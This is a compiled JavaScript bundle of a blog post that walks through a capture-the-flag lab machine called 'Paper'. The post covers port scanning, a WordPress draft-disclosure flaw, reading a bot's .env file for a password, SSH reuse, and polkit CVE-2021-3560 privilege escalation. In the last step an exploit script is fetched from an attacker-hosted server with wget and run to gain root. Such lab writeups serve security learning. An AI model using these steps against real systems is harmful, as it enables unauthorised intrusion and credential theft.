"use strict";(self.webpackChunkmy_blog=self.webpackChunkmy_blog||[]).push([[488],{320:(e,t,a)=>{a.d(t,{A:()=>i});const i=a.p+"assets/images/image-p-15-2ac857edd93cf1cec5182061be6e7495.png"},757:(e,t,a)=>{a.d(t,{A:()=>i});const i=a.p+"assets/images/image-p-8-b48a3b57ae20b928f8913c109e1736c1.png"},927:(e,t,a)=>{a.d(t,{A:()=>i});const i=a.p+"assets/images/image-p-19-a615991ddbe7d98e2868a4515644040b.png"},1291:(e,t,a)=>{a.d(t,{A:()=>i});const i=a.p+"assets/images/image-p-6-48216df3ac3a7de794a4d5ac8b930617.png"},1440:(e,t,a)=>{a.d(t,{A:()=>i});const i=a.p+"assets/images/image-p-5-9f04ccf1033dfa45b3a80c518fb56eb5.png"},1713:(e,t,a)=>{a.d(t,{A:()=>i});const i=a.p+"assets/images/image-p-17-cefb8c1c6014835d58f8188291472f69.png"},1910:(e,t,a)=>{a.d(t,{A:()=>i});const i=a.p+"assets/images/image-p-18-bb49644762a1bab9752b51f91f253f55.png"},3448:(e,t,a)=>{a.d(t,{A:()=>i});const i=a.p+"assets/images/image-p-16-80dc6b0c6547360b9d7e78cfd01b4b48.png"},3887:(e,t,a)=>{a.r(t),a.d(t,{assets:()=>r,contentTitle:()=>o,default:()=>d,frontMatter:()=>s,metadata:()=>l,toc:()=>g});var i=a(8168),n=(a(6540),a(5680));const s={},o=void 0,l={permalink:"/Blog/blog/Paper",editUrl:"https://github.com/danae-pan/Blog/blog/Paper.md",source:"@site/blog/Paper.md",title:"Paper",description:"Task 1",date:"2025-04-06T21:16:41.470Z",formattedDate:"April 6, 2025",tags:[],readingTime:4.24,truncated:!1,authors:[],prevItem:{title:"Writeup",permalink:"/Blog/blog/Writeup"},nextItem:{title:"Devvortex",permalink:"/Blog/blog/Devvortex"}},r={authorsImageUrls:[]},g=[{value:"Task 1",id:"task-1",children:[]},{value:"Task 2",id:"task-2",children:[]},{value:"Task 3",id:"task-3",children:[]},{value:"Task 4",id:"task-4",children:[]},{value:"Task 5",id:"task-5",children:[]},{value:"Task 6",id:"task-6",children:[]},{value:"Task 7",id:"task-7",children:[]},{value:"Task 8",id:"task-8",children:[]},{value:"Task 9",id:"task-9",children:[]},{value:"Task 10",id:"task-10",children:[]},{value:"Task 11",id:"task-11",children:[]},{value:"Task 12",id:"task-12",children:[]},{value:"Task 13",id:"task-13",children:[]}],p={toc:g},h="wrapper";function d(e){let{components:t,...s}=e;return(0,n.yg)(h,(0,i.A)({},p,s,{components:t,mdxType:"MDXLayout"}),(0,n.yg)("h3",{id:"task-1"},"Task 1"),(0,n.yg)("p",null,"How many TCP ports are open on the remote host?"),(0,n.yg)("p",null,(0,n.yg)("inlineCode",{parentName:"p"},"nmap -sS <target_ip>")),(0,n.yg)("p",null,(0,n.yg)("img",{alt:"alt text",src:a(5380).A})),(0,n.yg)("h3",{id:"task-2"},"Task 2"),(0,n.yg)("p",null,"What is the domain for the Wordpress blog?"),(0,n.yg)("p",null,"For answering this, we will attempt checking the information coming from the headers. "),(0,n.yg)("p",null,(0,n.yg)("inlineCode",{parentName:"p"},"curl -I <target_ip>")),(0,n.yg)("p",null,(0,n.yg)("img",{alt:"alt text",src:a(4287).A})),(0,n.yg)("p",null,"We can se that the server is leaking information from the backend systems from the X-Backend-Server header that contains the hostname of the target IP."),(0,n.yg)("h3",{id:"task-3"},"Task 3"),(0,n.yg)("p",null,"Which 2019 CVE is the wordpress version vulnerable to?"),(0,n.yg)("p",null,"First, we need to identify the version of wordpress. First, we add the domain to the host file by ",(0,n.yg)("inlineCode",{parentName:"p"},"sudo vim /etc/hosts")),(0,n.yg)("p",null,(0,n.yg)("img",{alt:"alt text",src:a(5270).A})),(0,n.yg)("p",null,"Then, we use wpscan, the WordPress security scanner, to find the version and any vulnerabilities. "),(0,n.yg)("p",null,(0,n.yg)("img",{alt:"alt text",src:a(8345).A})),(0,n.yg)("p",null,"We found both the readme.html file location, which usually contains the wordpress version but the specific version was already identified. With a quick google search about the specific version we find the 2019 CVE."),(0,n.yg)("h3",{id:"task-4"},"Task 4"),(0,n.yg)("p",null,"What is the secret registration URL of the employee chat system?"),(0,n.yg)("p",null,"We first need to enumerate the directories using gobuster dir."),(0,n.yg)("p",null,(0,n.yg)("inlineCode",{parentName:"p"},"gobuster dir -u http://office.paper/ -w <word_list>")),(0,n.yg)("p",null,(0,n.yg)("img",{alt:"alt text",src:a(1440).A})),(0,n.yg)("p",null,"Navigating to the index.php page we see some kind of chat system."),(0,n.yg)("p",null,(0,n.yg)("img",{alt:"alt text",src:a(1291).A})),(0,n.yg)("p",null,"Going back to the CVE we previously found, this version could allow an unauthenticated user to view private or draft posts. Navigating to the page we also find this interesting post by the user Prinsonmike. Seems that we can use this wordpress vulnerability to access his draft hoping we can find this secret url."),(0,n.yg)("p",null,(0,n.yg)("img",{alt:"alt text",src:a(757).A})),(0,n.yg)("p",null,"We navigate ",(0,n.yg)("inlineCode",{parentName:"p"},"http://office.paper/?static=1")," and exploit the vulnerability and find the secret url."),(0,n.yg)("p",null,(0,n.yg)("img",{alt:"alt text",src:a(7692).A})),(0,n.yg)("h3",{id:"task-5"},"Task 5"),(0,n.yg)("p",null,"What is the name of the bot running on the Rocket Chat instance?"),(0,n.yg)("p",null,"We need to first add to the hosts file the subdomain ",(0,n.yg)("inlineCode",{parentName:"p"},"chat.office.paper")," so the ip get resolved. "),(0,n.yg)("p",null,"Navigating to the secret url we found on the previous task we see the registration form."),(0,n.yg)("p",null,(0,n.yg)("img",{alt:"alt text",src:a(5598).A})),(0,n.yg)("p",null,"We register, and the go to the general channel where we see the name of the bot."),(0,n.yg)("p",null,(0,n.yg)("img",{alt:"alt text",src:a(8615).A})),(0,n.yg)("h3",{id:"task-6"},"Task 6"),(0,n.yg)("p",null,"Which recyclops commands allows listing files?"),(0,n.yg)("p",null,'In the "How to use me?" guide of the bot we see all the commands, including the one listing files.'),(0,n.yg)("p",null,(0,n.yg)("img",{alt:"alt text",src:a(4332).A})),(0,n.yg)("h3",{id:"task-7"},"Task 7"),(0,n.yg)("p",null,"What is the file name of the file that contains the configuration information of hubot running on the chat system?"),(0,n.yg)("p",null,"Hubot is a framework to build chat bots. We will try to chat with recyclops, using the commands available to extract the information about the name of the file. Running ",(0,n.yg)("inlineCode",{parentName:"p"},"list")," we see that we are on user dwight home directory. "),(0,n.yg)("p",null,(0,n.yg)("img",{alt:"alt text",src:a(320).A})),(0,n.yg)("p",null,"We go back to the direcotry with ",(0,n.yg)("inlineCode",{parentName:"p"},"list ../")," and then list the directory hubot ",(0,n.yg)("inlineCode",{parentName:"p"},"list ../hubot"),"."),(0,n.yg)("p",null,(0,n.yg)("img",{alt:"alt text",src:a(3448).A})),(0,n.yg)("p",null,"Looking through the listed files and google searching hubot documentation to cross-reference, we see some files that could be possible like ",(0,n.yg)("inlineCode",{parentName:"p"},".env")," and ",(0,n.yg)("inlineCode",{parentName:"p"},"external-scripts"),". We see their contents, first ",(0,n.yg)("inlineCode",{parentName:"p"},"file ../hubot/external-scripts.json")," is empty and then ",(0,n.yg)("inlineCode",{parentName:"p"},"file ../hubot/.env")," is the one containing the configuration."),(0,n.yg)("p",null,(0,n.yg)("img",{alt:"alt text",src:a(1713).A})),(0,n.yg)("h3",{id:"task-8"},"Task 8"),(0,n.yg)("p",null,"What is the password obtained from that configuration information?"),(0,n.yg)("p",null,"From the ",(0,n.yg)("inlineCode",{parentName:"p"},".env")," file we obtained from the previous question, we find the password. "),(0,n.yg)("h3",{id:"task-9"},"Task 9"),(0,n.yg)("p",null,"Which regular user with a home directory exists on Paper other than rocketchat?"),(0,n.yg)("p",null,"From the previous tasks, we saw that we where on the regular user dwight directory."),(0,n.yg)("h3",{id:"task-10"},"Task 10"),(0,n.yg)("p",null,"Submit the flag located in the dwight user's home directory."),(0,n.yg)("p",null,"Previously, when we listed the home directory, by running ",(0,n.yg)("inlineCode",{parentName:"p"},"list ../")," we came accross the ",(0,n.yg)("inlineCode",{parentName:"p"},"user.txt")," file. We try to see the contents and get the user flag by ",(0,n.yg)("inlineCode",{parentName:"p"},"file ../user.txt")," but we get access denied. We try to ssh to the target ip with the username dwight ",(0,n.yg)("inlineCode",{parentName:"p"},"ssh dwight@<target_ip")," and the password we found in the ",(0,n.yg)("inlineCode",{parentName:"p"},".env")," file and we are in! We get the user flag by ",(0,n.yg)("inlineCode",{parentName:"p"},"cat user.txt"),"."),(0,n.yg)("h3",{id:"task-11"},"Task 11"),(0,n.yg)("p",null,"What is the polkit version on the remote host?"),(0,n.yg)("p",null,"We first run ",(0,n.yg)("inlineCode",{parentName:"p"},"cat /etc/os-release")," to find which os we are on and we see that we are on CentOS. Then we can run ",(0,n.yg)("inlineCode",{parentName:"p"},"rpm -qa | grep polkit\n")," to find the version of polkit."),(0,n.yg)("p",null,(0,n.yg)("img",{alt:"alt text",src:a(1910).A}),"\n",(0,n.yg)("img",{alt:"alt text",src:a(927).A})),(0,n.yg)("h3",{id:"task-12"},"Task 12"),(0,n.yg)("p",null,"What is the 2021 CVE ID for the vulnerability in this version of polkit related to bypassing credential checks for D-Bus requests?"),(0,n.yg)("p",null,"Looking up for CVEs affecting the version of the polkit found, we find CVE-2021-3560 for the vulnerability that allows an unprivileged user to create an administrative user without authentication by abusing D-Bus and timing. "),(0,n.yg)("h3",{id:"task-13"},"Task 13"),(0,n.yg)("p",null,"In our machine, we clone the exploit from github ",(0,n.yg)("a",{parentName:"p",href:"https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation"},"https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation"),". Then, we open a http server on port 8080 using ",(0,n.yg)("inlineCode",{parentName:"p"},"python3 -m http.server 8080"),". From the remote server, we use wget to get the exploit script ",(0,n.yg)("inlineCode",{parentName:"p"},"wget http://<host_ip>:8080/poc.sh"),". We then ",(0,n.yg)("inlineCode",{parentName:"p"},"chmod +x poc.sh")," and run the exploit as many times as needed to get the timing right. We follow the exploit's instruction and get a root shell as the secnigma user. "),(0,n.yg)("p",null,"We navigate to the root directory and obtain the root flag by ",(0,n.yg)("inlineCode",{parentName:"p"},"cat root.txt")),(0,n.yg)("p",null,(0,n.yg)("img",{alt:"alt text",src:a(7599).A})))}d.isMDXComponent=!0},4287:(e,t,a)=>{a.d(t,{A:()=>i});const i=a.p+"assets/images/image-p-2-7221cf04b4960b24b208b606c281ddf0.png"},4332:(e,t,a)=>{a.d(t,{A:()=>i});const i=a.p+"assets/images/image-p-12-d4c13f83c2f0a2232856e3c2151eeb38.png"},5270:(e,t,a)=>{a.d(t,{A:()=>i});const i=a.p+"assets/images/image-p-3-61f0d3cc7ec0a2cc30019cd03d5893e6.png"},5380:(e,t,a)=>{a.d(t,{A:()=>i});const i=a.p+"assets/images/image-p-1-d23893e8bdd9381fd08d82682fa601cf.png"},5598:(e,t,a)=>{a.d(t,{A:()=>i});const i=a.p+"assets/images/image-p-10-7304dbaee416aa6458274a48fdd2e9c0.png"},7599:(e,t,a)=>{a.d(t,{A:()=>i});const i=a.p+"assets/images/image-p-20-d4449895b688d00017627e8a6ce3c5d0.png"},7692:(e,t,a)=>{a.d(t,{A:()=>i});const i=a.p+"assets/images/image-p-9-4d69abc44ef1bb79c90a4c069caace5d.png"},8345:(e,t,a)=>{a.d(t,{A:()=>i});const i=a.p+"assets/images/image-p-4-311aec8fdcb7edd7fc8f2337c8afe033.png"},8615:(e,t,a)=>{a.d(t,{A:()=>i});const i=a.p+"assets/images/image-p-11-fa8caaddef1019ec0d7735031f27a1cc.png"}}]);